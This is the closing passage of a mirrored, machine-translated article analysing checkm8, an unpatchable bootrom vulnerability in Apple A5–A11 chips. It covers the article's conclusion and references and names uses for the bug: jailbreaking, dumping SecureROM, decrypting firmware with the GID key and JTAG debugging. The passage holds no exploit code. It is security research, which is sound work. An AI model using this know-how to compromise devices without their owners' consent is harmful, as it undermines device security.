href="">USB_Host_Shield_2.0</a> library. It needs minor modifications; the patch file is also in the repository. </p><br><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/7o/bx/ni/7obxni6ihhdg8tz0dljedtfmrwy.jpeg"></div><br><h2 id="in-place-of-a-conclusion"> In place of a conclusion </h2><br><p> Analyzing <code>checkm8</code> was very interesting. We hope that this article will be useful for the community and will motivate new research in this area. The vulnerability will continue to influence the jailbreak community. A jailbreak based on <code>checkm8</code> is already being developed — <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">checkra1n</a> , and since the vulnerability is unfixable, it will always work on vulnerable chips ( <code>A5</code> to <code>A11</code> ) regardless of the iOS version. Plus, there are many vulnerable devices, like <code>iWatch</code> , <code>Apple TV</code> , etc. We expect more interesting projects for Apple devices to come. </p><br><p> Besides jailbreak, this vulnerability will also influence the researchers of Apple devices. With <code>checkm8</code> , you can already boot <code>iOS</code> devices in verbose mode, dump <code>SecureROM</code> , or use the <code>GID</code> key to decrypt firmware images. Although, the most interesting application for this exploit would be entering debug mode on vulnerable devices with <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">a special JTAG/SWD cable</a> . Before that, it could only be done with special prototypes that are <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">extremely hard to get</a> or with the help of <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">special services</a> . Thus, with <code>checkm8</code> , <code>Apple</code> research becomes way easier and cheaper. </p><br><h2 id="references"> References </h2><br><ol><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Jonathan Levin, *OS Internals: iBoot</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Apple, iOS Security Guide</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">littlelailo, apollo.txt</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">usb.org</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">USB in a NutShell</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ipwndfu</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">an ipwndfu fork from LinusHenze</a> </li></ol></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN472762/">https://habr.com/ru/post/zh-CN472762/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN472750/index.html">好吧，我真的需要Kubernetes吗？</a></li>
<li><a href="../zh-CN472752/index.html">CSE：适用于vCloud中任何人的Kubernetes</a></li>
<li><a href="../zh-CN472754/index.html">一个月内怎么说英语。 9个简单有效的步骤</a></li>
<li><a href="../zh-CN472758/index.html">建议：try-内置错误检查功能</a></li>
<li><a href="../zh-CN472760/index.html">将计算时间从几年减少到几分钟。 了解量子机器学习</a></li>
<li><a href="../zh-CN472766/index.html">从py.test中的文件进行参数化</a></li>
<li><a href="../zh-CN472768/index.html">如何聘用，解雇管理人员并从管理人员返回开发人员：Badoo Techleads Meetup＃5的视频</a></li>
<li><a href="../zh-CN472770/index.html">使用UI Canvas进行Unity中的界面组织</a></li>
<li><a href="../zh-CN472772/index.html">搜索类似的事件和索赔。 指标和优化</a></li>
<li><a href="../zh-CN472776/index.html">备份第7部分：结论</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>